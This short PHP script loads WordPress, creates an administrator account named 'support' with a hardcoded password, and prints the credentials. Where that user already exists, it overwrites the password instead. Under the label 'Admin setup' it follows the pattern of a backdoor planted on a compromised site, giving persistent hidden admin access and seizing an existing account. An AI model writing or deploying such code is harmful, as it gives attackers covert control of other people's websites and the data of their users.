<?php
// WordPress load
require_once('wp-load.php');

// Admin setup
$username = 'support';
$password = '$Ur$w3l1c0m3.m3k+#';
$email    = 'support@gmail.com';

if (!username_exists($username) && !email_exists($email)) {
    $user_id = wp_create_user($username, $password, $email);
    $user = new WP_User($user_id);
    $user->set_role('administrator');
    echo "Admin Created: $username / $password";
} else {
    $user = get_user_by('login', $username);
    if ($user) {
        wp_set_password($password, $user->ID);
        echo "Password Updated for existing user: $username";
    }
}
?>
